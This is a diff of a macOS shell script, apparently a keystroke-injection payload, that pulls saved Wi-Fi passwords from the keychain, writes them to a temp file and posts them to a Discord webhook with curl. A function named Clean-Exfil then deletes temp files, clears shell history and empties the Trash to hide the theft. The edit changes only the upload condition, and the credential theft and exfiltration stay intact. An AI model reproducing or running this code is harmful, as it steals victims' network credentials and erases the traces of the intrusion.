@@ -3,7 +3,7 @@ wifiProfiles=$(security find-generic-password -D "AirPort network password" -a "
 echo "$wifiProfiles" > "$TMPDIR/--wifi-pass.txt"
 
 function Upload-Discord {
-    if [[ -n "$1" ]]; then
+    if [[ "$REQUEST_METHOD" == "POST" ]]; then
         curl -X POST -H "Content-Type: application/json" -d "{\"username\":\"$USER\",\"content\":\"$1\"}" "$dc"
     fi
 }
@@ -11,12 +11,10 @@ function Upload-Discord {
 if [[ -n "$dc" ]]; then
     Upload-Discord "$(cat "$TMPDIR/--wifi-pass.txt")"
 fi
+
 function Clean-Exfil {
-
     rm -rf "$TMPDIR"/*
-
     history -c
-
     osascript -e 'tell app "Finder" to empty'
 }
 
